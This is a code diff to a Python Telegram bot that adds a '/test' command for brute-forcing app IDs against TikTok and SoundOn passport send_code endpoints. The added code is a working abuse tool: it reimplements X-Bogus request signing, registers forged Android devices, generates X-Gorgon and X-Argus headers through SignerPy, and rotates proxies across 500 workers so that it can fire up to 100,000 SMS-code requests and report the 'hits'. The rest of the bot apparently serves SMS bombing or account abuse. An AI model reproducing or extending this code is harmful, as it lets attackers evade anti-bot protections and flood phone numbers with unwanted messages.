@@ -52,7 +52,7 @@ from telegram.ext import (
 # Import SignerPy for signature generation
 try:
     import SignerPy as SP
-    from SignerPy import xor
+    from SignerPy import xor, sign
     SIGNERPY_AVAILABLE = True
 except ImportError:
     SIGNERPY_AVAILABLE = False
@@ -2545,6 +2545,12 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 /cancel ID — Cancel a task
 /stats — Global hit statistics
 
+<b>━━━ Advanced ━━━</b>
+/test — AID brute force scanner (1-100k)
+/test web — 100k scan on web endpoint
+/test mobile — 100k scan on signed mobile
+/test vip — Known AIDs x all TCs combo
+
 <b>━━━ General ━━━</b>
 /start — Main menu with buttons
 /help — This command list
@@ -3953,6 +3959,10 @@ async def _handle_setsep_callback(query, user_id, data_str):
             # Move to step 3: AID
             keyboard = [
                 [InlineKeyboardButton("2960 (default)", callback_data="setsep_aid|2960")],
+                [InlineKeyboardButton("5049", callback_data="setsep_aid|5049"),
+                 InlineKeyboardButton("4174", callback_data="setsep_aid|4174")],
+                [InlineKeyboardButton("6556", callback_data="setsep_aid|6556"),
+                 InlineKeyboardButton("4068", callback_data="setsep_aid|4068")],
                 [InlineKeyboardButton("Custom AID", callback_data="setsep_aid|custom")],
             ]
             await query.edit_message_text(
@@ -3964,6 +3974,9 @@ async def _handle_setsep_callback(query, user_id, data_str):
                 reply_markup=InlineKeyboardMarkup(keyboard),
             )
 
+    elif data_str.startswith("test_mode|"):
+        await handle_test_mode_callback(query, context, user_id)
+        return
     elif data_str.startswith("setsep_aid|"):
         aid_val = data_str.split("|", 1)[1]
         if aid_val == "custom":
@@ -3995,6 +4008,25 @@ async def _handle_setsep_callback(query, user_id, data_str):
 def _finish_setsep(query_unused, user_id):
     """Clean up temp setsep state."""
     user_states[user_id].pop('_setsep_domain_display', None)
+
+
+async def handle_test_mode_callback(query, context, user_id):
+    """Handle /test mode selection from inline buttons."""
+    mode = query.data.split("|", 1)[1]
+    proxies = user_states[user_id].get('proxies', [])
+    if not proxies:
+        await query.edit_message_text(
+            "<b>No proxies loaded!</b>\nUse /sprox or /uprox first.",
+            parse_mode="HTML")
+        return
+    await query.edit_message_text(
+        f"<b>AID Brute Force Started</b>\n\n"
+        f"Mode: <code>{mode}</code>\n"
+        f"Workers: {TEST_WORKERS}\n"
+        f"Proxies: {len(proxies)}\n\n"
+        f"Results coming as they hit...",
+        parse_mode="HTML")
+    asyncio.create_task(_run_test_scan(context, query.message.chat_id, user_id, mode, proxies))
 
 
 # ============================================
@@ -4354,6 +4386,346 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ============================================
+# /test — AID Brute Force Command
+# ============================================
+
+TEST_WORKERS = 500
+
+async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """AID brute force: test AIDs 1-100k on web/mobile/VIP endpoints.
+
+    Usage:
+      /test          -> interactive menu
+      /test web      -> 100k scan on web endpoint
+      /test mobile   -> 100k scan on signed mobile endpoint
+      /test vip      -> VIP combo (known working AIDs x all TCs)
+    """
+    user_id = update.effective_user.id
+    proxies = user_states[user_id].get('proxies', [])
+
+    if not proxies:
+        await update.message.reply_text(
+            "<b>No proxies loaded!</b>\n\n"
+            "Use /sprox or /uprox to add proxies first.\n"
+            "The /test command needs proxies (IP rotation) to scan properly.",
+            parse_mode="HTML")
+        return
+
+    mode = context.args[0].lower() if context.args else None
+
+    if mode in ("web", "mobile", "mob", "vip"):
+        msg = await update.message.reply_text(
+            f"<b>AID Brute Force Started</b>\n\n"
+            f"Mode: <code>{mode}</code>\n"
+            f"Range: 1 - 100,000\n"
+            f"Workers: {TEST_WORKERS}\n"
+            f"Proxies: {len(proxies)}\n\n"
+            f"Results will be sent as they come...",
+            parse_mode="HTML")
+        asyncio.create_task(_run_test_scan(context, update.effective_chat.id, user_id, mode, proxies))
+        return
+
+    # Interactive menu
+    keyboard = [
+        [InlineKeyboardButton("Web Endpoint (100k)", callback_data="test_mode|web")],
+        [InlineKeyboardButton("Mobile Signed (100k)", callback_data="test_mode|mobile")],
+        [InlineKeyboardButton("VIP Combo (known AIDs x TCs)", callback_data="test_mode|vip")],
+    ]
+    await update.message.reply_text(
+        "<b>AID Brute Force Scanner</b>\n\n"
+        "Select scan mode:\n\n"
+        "<b>Web</b> — /passport/web/send_code/ (X-Bogus, no signing)\n"
+        "<b>Mobile</b> — /passport/mobile/send_code/v1/ (SignerPy signed)\n"
+        "<b>VIP</b> — Known working AIDs tested with all TCs\n\n"
+        f"Workers: {TEST_WORKERS} | Proxies: {len(proxies)}",
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(keyboard))
+
+
+async def _run_test_scan(context, chat_id, user_id, mode, proxies):
+    """Background task: run the AID brute force scan."""
+    import hashlib as _hs, base64 as _b64, struct as _st
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    from io import BytesIO
+
+    proxy_list = list(proxies)
+    phone = "+923012345678"
+    tc_default = 3536
+    timeout = 15
+
+    # X-Bogus helpers (inline for thread safety)
+    _CUSTOM_B64 = "Dkdpgh4ZKsQB80/Mfvw36XI1R25-WUAlEi7NLboqYTOPuzmFjJnryx9HVGcaStCe="
+    _STD_B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
+    _UA_KEY = bytes([0x00, 0x01, 0x0E]); _PL_KEY = bytes([0xFF]); _MAGIC = 0x4A41279F
+    _WEB_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+
+    def _rc4(key, data):
+        S = list(range(256)); j = 0
+        for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256; S[i], S[j] = S[j], S[i]
+        out = bytearray(); i = j = 0
+        for b in data:
+            i = (i + 1) % 256; j = (j + S[i]) % 256; S[i], S[j] = S[j], S[i]
+            out.append(b ^ S[(S[i] + S[j]) % 256])
+        return bytes(out)
+
+    def _md5(d):
+        if isinstance(d, str): d = d.encode()
+        return _hs.md5(d).hexdigest()
+
+    def _xbogus(query, body=""):
+        ts = int(time.time())
+        p = bytes.fromhex(_md5(bytes.fromhex(_md5(query))))
+        b = bytes.fromhex(_md5(bytes.fromhex(_md5(body or ""))))
+        u = bytes.fromhex(_md5(_b64.b64encode(_rc4(_UA_KEY, _WEB_UA.encode())).decode("iso-8859-1")))
+        pl = bytearray([0x40]) + bytearray(_UA_KEY) + bytearray(p[14:16]) + bytearray(b[14:16]) + bytearray(u[14:16]) + bytearray(_st.pack(">I", ts)) + bytearray(_st.pack(">I", _MAGIC))
+        x = 0
+        for byte in pl: x ^= byte
+        pl.append(x & 0xFF)
+        final = bytes([0x02, 0xFF]) + _rc4(_PL_KEY, bytes(pl))
+        return _b64.b64encode(final).decode("ascii").translate(str.maketrans(_STD_B64, _CUSTOM_B64))
+
+    def _encode_phone(ph):
+        return "".join(f"{ord(c) ^ 5:02x}" for c in ph)
+
+    # ── Web endpoint test ──
+    def _test_web(aid):
+        try:
+            proxy = random.choice(proxy_list)
+            s = requests.Session()
+            s.headers["user-agent"] = _WEB_UA
+            if not proxy.startswith("http"): proxy = f"http://{proxy}"
+            s.proxies = {"http": proxy, "https": proxy}; s.verify = False
+            domain = random.choice(["www.soundon.global", "www.tiktok.com"])
+            encoded = _encode_phone(phone)
+            body = f"mix_mode=1&mobile={encoded}&type={tc_default}&language=en&fixed_mix_mode=1"
+            params = {"aid": str(aid), "account_sdk_source": "web", "sdk_version": "2.1.10-tiktok", "language": "en"}
+            qs = urlencode(params); params["X-Bogus"] = _xbogus(qs, body)
+            r = s.post(f"https://{domain}/passport/web/send_code/", params=params, data=body,
+                       headers={"content-type": "application/x-www-form-urlencoded",
+                                "referer": f"https://{domain}/"}, timeout=timeout)
+            s.close()
+            data = r.json()
+            d = data.get("data", {}) if isinstance(data.get("data"), dict) else {}
+            ec = d.get("error_code"); msg = data.get("message", "")
+            desc = d.get("description", "")[:60]; ticket = d.get("mobile_ticket", "")
+            return {"aid": aid, "ec": ec, "msg": msg, "desc": desc, "success": msg == "success",
+                    "ticket": ticket[:30], "domain": domain, "tc": tc_default, "type": "web"}
+        except Exception as e:
+            return {"aid": aid, "ec": None, "msg": "err", "desc": str(e)[:50], "success": False, "type": "web"}
+
+    # ── Mobile signed endpoint test ──
+    def _test_mobile(aid):
+        if not SIGNERPY_AVAILABLE:
+            return {"aid": aid, "ec": None, "msg": "no_signer", "desc": "", "success": False, "type": "mobile"}
+        try:
+            proxy = random.choice(proxy_list)
+            if not proxy.startswith("http") and not proxy.startswith("socks"): proxy = f"http://{proxy}"
+            brand = "Samsung"; model = "SM-G991B"; android_ver = "14"; api_lvl = "34"
+            build_id = "UP1A.231005.007"
+            openudid = ''.join(random.choices('0123456789abcdef', k=16))
+            cdid = str(uuid.uuid4())
+            odin_tt = ''.join(random.choices('0123456789abcdef', k=160))
+            csrf_token = ''.join(random.choices('0123456789abcdef', k=32))
+            ua = f"com.zhiliaoapp.musically/350804 (Linux; U; Android {android_ver}; en_US; {model}; Build/{build_id}; Cronet/TTNetVersion:b714bfef 2024-09-13 QuicVersion:c459d547 2024-08-27)"
+            # Device register
+            reg_p = {"aid": str(aid), "app_name": "musical_ly", "version_code": "350804",
+                     "version_name": "35.8.4", "device_platform": "android", "os": "android",
+                     "os_api": api_lvl, "os_version": android_ver, "device_type": model,
+                     "device_brand": brand, "language": "en", "ac": "wifi", "channel": "googleplay",
+                     "resolution": "1080*2400", "dpi": "420", "openudid": openudid, "cdid": cdid,
+                     "ts": str(int(time.time())), "_rticket": str(int(time.time())*1000)}
+            reg_body = json.dumps({"magic_tag": "ss_app_log", "header": {
+                "display_name": "TikTok", "update_version_code": 350804,
+                "manifest_version_code": 350804, "aid": aid, "channel": "googleplay",
+                "package": "com.zhiliaoapp.musically", "app_version": "35.8.4",
+                "version_code": 350804, "sdk_version": "2.14.0-rc.8",
+                "os": "Android", "os_version": android_ver, "os_api": int(api_lvl),
+                "device_model": model, "device_brand": brand, "device_manufacturer": brand,
+                "cpu_abi": "arm64-v8a", "density_dpi": 420, "resolution": "1080x2400",
+                "language": "en", "timezone": 5, "access": "wifi",
+                "cdid": cdid, "sig_hash": "aea615ab", "openudid": openudid,
+                "clientudid": str(uuid.uuid4()), "region": "US",
+                "tz_name": "Asia/Karachi", "tz_offset": 18000, "sim_region": "pk"},
+                "_gen_ts": int(time.time())})
+            s = requests.Session()
+            s.proxies = {"http": proxy, "https": proxy}; s.verify = False
+            try:
+                resp = s.post(f"https://api3-normal-c-lf.amemv.com/service/2/device_register/?{urlencode(reg_p)}",
+                             data=reg_body, headers={"Host": "api3-normal-c-lf.amemv.com",
+                             "User-Agent": ua, "Content-Type": "application/json"}, timeout=timeout)
+                rd = resp.json()
+                device_id = str(rd.get("device_id", "0")); iid = str(rd.get("install_id", "0"))
+            except:
+                device_id = ''.join(random.choices(string.digits, k=16))
+                iid = ''.join(random.choices(string.digits, k=16))
+            timestamp = int(time.time()); rticket = str(timestamp * 1000 + random.randint(1000, 9999))
+            encrypted = xor(phone)
+            common = {"passport-sdk-version": "50559", "iid": iid, "device_id": device_id,
+                      "ac": "wifi", "channel": "googleplay", "aid": str(aid), "app_name": "musical_ly",
+                      "version_code": "350804", "version_name": "35.8.4", "device_platform": "android",
+                      "os": "android", "ssmix": "a", "device_type": model, "device_brand": brand,
+                      "language": "en", "os_api": api_lvl, "os_version": android_ver,
+                      "manifest_version_code": "350804", "resolution": "1080*2400", "dpi": "420",
+                      "update_version_code": "350804", "cdid": cdid, "carrier_region": "PK"}
+            url_p = dict(common); url_p["_rticket"] = rticket; url_p["ts"] = str(timestamp)
+            body_p = dict(common)
+            body_p.update({"auto_read": "0", "account_sdk_source": "app", "unbind_exist": "35",
+                           "mix_mode": "1", "mobile": encrypted, "type": str(tc_default),
+                           "_rticket": rticket, "ts": str(timestamp),
+                           "is6Digits": "1", "check_register": "1", "multi_login": "1"})
+            url_qs = urlencode(url_p); body_str = urlencode(body_p)
+            cookie_str = f"odin_tt={odin_tt}; install_id={iid}; passport_csrf_token_default={csrf_token}"
+            sigs = sign(params=url_qs, payload=body_str, cookie=cookie_str, version=8404, aid=aid)
+            domain = random.choice(["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com"])
+            headers = {"Host": domain, "Cookie": cookie_str,
+                       "x-tt-passport-csrf-token": csrf_token, "X-SS-REQ-TICKET": rticket,
+                       "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                       "X-SS-DP": str(aid), "User-Agent": ua, "Accept-Encoding": "gzip, deflate",
+                       "X-Gorgon": sigs.get("x-gorgon", ""), "X-Khronos": sigs.get("x-khronos", str(timestamp)),
+                       "X-Argus": sigs.get("x-argus", ""), "X-Ladon": sigs.get("x-ladon", ""),
+                       "X-SS-STUB": sigs.get("x-ss-stub", _hs.md5(body_str.encode()).hexdigest().upper())}
+            ep = "/passport/mobile/send_code/v1/"
+            r2 = s.post(f"https://{domain}{ep}?{url_qs}", data=body_str, headers=headers, verify=False, timeout=timeout)
+            data = r2.json(); s.close()
+            d = data.get("data", {}) if isinstance(data.get("data"), dict) else {}
+            ec = d.get("error_code") or data.get("error_code"); msg = data.get("message", "")
+            desc = d.get("description", "")[:60]; ticket = d.get("mobile_ticket", "")
+            return {"aid": aid, "ec": ec, "msg": msg, "desc": desc, "success": msg == "success",
+                    "ticket": ticket[:30], "domain": domain, "tc": tc_default, "type": "mobile"}
+        except Exception as e:
+            return {"aid": aid, "ec": None, "msg": "err", "desc": str(e)[:50], "success": False, "type": "mobile"}
+
+    # ── VIP combo test ──
+    VIP_AIDS = [4174, 6556, 4068, 5049, 2960, 473824, 1233, 1340, 364, 1180, 1988, 2658]
+    VIP_TCS = [3536, 3635, 3637, 3634, 3734, 3532, 3733, 3531, 3633, 3736, 3537, 34, 3630]
+
+    def _test_vip_combo(combo):
+        aid, tc = combo
+        try:
+            proxy = random.choice(proxy_list)
+            if not proxy.startswith("http"): proxy = f"http://{proxy}"
+            s = requests.Session()
+            s.headers["user-agent"] = _WEB_UA
+            s.proxies = {"http": proxy, "https": proxy}; s.verify = False
+            domain = "www.soundon.global"
+            encoded = _encode_phone(phone)
+            body = f"mix_mode=1&mobile={encoded}&type={tc}&language=en&fixed_mix_mode=1"
+            params = {"aid": str(aid), "account_sdk_source": "web", "sdk_version": "2.1.10-tiktok", "language": "en"}
+            qs = urlencode(params); params["X-Bogus"] = _xbogus(qs, body)
+            r = s.post(f"https://{domain}/passport/web/send_code/", params=params, data=body,
+                       headers={"content-type": "application/x-www-form-urlencoded",
+                                "referer": f"https://{domain}/"}, timeout=timeout)
+            s.close()
+            data = r.json()
+            d = data.get("data", {}) if isinstance(data.get("data"), dict) else {}
+            ec = d.get("error_code"); msg = data.get("message", ""); desc = d.get("description", "")[:60]
+            ticket = d.get("mobile_ticket", "")
+            return {"aid": aid, "ec": ec, "msg": msg, "desc": desc, "success": msg == "success",
+                    "ticket": ticket[:30], "domain": domain, "tc": tc, "type": "vip"}
+        except Exception as e:
+            return {"aid": aid, "ec": None, "msg": "err", "desc": str(e)[:50], "success": False,
+                    "tc": tc, "type": "vip"}
+
+    # ── Run scan ──
+    successes = []
+    total = 0
+    done = [0]
+    start_time = time.time()
+
+    try:
+        if mode == "vip":
+            combos = [(aid, tc) for aid in VIP_AIDS for tc in VIP_TCS]
+            total = len(combos)
+            await context.bot.send_message(chat_id,
+                f"<b>VIP Scan:</b> {len(VIP_AIDS)} AIDs x {len(VIP_TCS)} TCs = {total} combos\n"
+                f"Workers: {TEST_WORKERS}", parse_mode="HTML")
+
+            with ThreadPoolExecutor(max_workers=min(TEST_WORKERS, total)) as pool:
+                futures = {pool.submit(_test_vip_combo, c): c for c in combos}
+                for fut in as_completed(futures):
+                    try:
+                        r = fut.result()
+                        done[0] += 1
+                        if r.get("success"):
+                            successes.append(r)
+                            await context.bot.send_message(chat_id,
+                                f"<b>VIP HIT!</b> aid={r['aid']} tc={r['tc']} domain={r['domain']}\n"
+                                f"ticket={r.get('ticket','')}",
+                                parse_mode="HTML")
+                    except: pass
+                    if done[0] % 50 == 0:
+                        await context.bot.send_message(chat_id,
+                            f"Progress: {done[0]}/{total} | Hits: {len(successes)}")
+
+        else:
+            # Web or Mobile: 100k AIDs
+            total = 100000
+            test_fn = _test_web if mode == "web" else _test_mobile
+            aids = list(range(1, 100001))
+
+            with ThreadPoolExecutor(max_workers=TEST_WORKERS) as pool:
+                futures = {pool.submit(test_fn, aid): aid for aid in aids}
+                for fut in as_completed(futures):
+                    try:
+                        r = fut.result()
+                        done[0] += 1
+                        if r.get("success"):
+                            successes.append(r)
+                            await context.bot.send_message(chat_id,
+                                f"<b>HIT!</b> [{mode.upper()}] aid={r['aid']} tc={r.get('tc')} "
+                                f"domain={r.get('domain','')}\nticket={r.get('ticket','')}",
+                                parse_mode="HTML")
+                    except: pass
+                    if done[0] % 5000 == 0:
+                        elapsed = time.time() - start_time
+                        await context.bot.send_message(chat_id,
+                            f"Progress: {done[0]:,}/{total:,} | Hits: {len(successes)} | "
+                            f"Time: {elapsed:.0f}s")
+
+        # ── Done: send summary + TXT file ──
+        elapsed = time.time() - start_time
+        summary = (
+            f"<b>Scan Complete!</b>\n\n"
+            f"Mode: {mode.upper()}\n"
+            f"Tested: {done[0]:,}\n"
+            f"Success: {len(successes)}\n"
+            f"Time: {elapsed:.0f}s ({elapsed/60:.1f}min)\n"
+        )
+        if successes:
+            summary += "\n<b>Working Combinations:</b>\n"
+            for r in successes:
+                summary += f"  aid={r['aid']} tc={r.get('tc')} domain={r.get('domain','')}\n"
+
+        await context.bot.send_message(chat_id, summary, parse_mode="HTML")
+
+        # Send TXT file with results
+        if successes:
+            txt_content = f"AID Brute Force Results — {mode.upper()}\n"
+            txt_content += f"Date: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
+            txt_content += f"Tested: {done[0]:,} | Success: {len(successes)} | Time: {elapsed:.0f}s\n"
+            txt_content += f"Phone: {phone} | TC: {tc_default}\n"
+            txt_content += "=" * 60 + "\n\n"
+            for r in successes:
+                txt_content += (
+                    f"AID: {r['aid']}\n"
+                    f"  Type: {r.get('type','')}\n"
+                    f"  TC: {r.get('tc','')}\n"
+                    f"  Domain: {r.get('domain','')}\n"
+                    f"  Ticket: {r.get('ticket','')}\n"
+                    f"  Desc: {r.get('desc','')}\n\n"
+                )
+            buf = BytesIO(txt_content.encode())
+            buf.name = f"bf_results_{mode}_{int(time.time())}.txt"
+            await context.bot.send_document(chat_id, document=buf,
+                caption=f"AID Brute Force — {len(successes)} hits found")
+        else:
+            await context.bot.send_message(chat_id, "No successful AIDs found in this scan.")
+
+    except Exception as e:
+        await context.bot.send_message(chat_id, f"Scan error: {str(e)[:200]}")
+
+
+# ============================================
 # MAIN
 # ============================================
 
@@ -4403,6 +4775,7 @@ def main():
     application.add_handler(CommandHandler("sep", sep_command))
     application.add_handler(CommandHandler("setdelay", setdelay_command))
     application.add_handler(CommandHandler("done", done_command))
+    application.add_handler(CommandHandler("test", test_command))
     
     # Short command aliases
     application.add_handler(CommandHandler("unum", uploadnumbers_command))
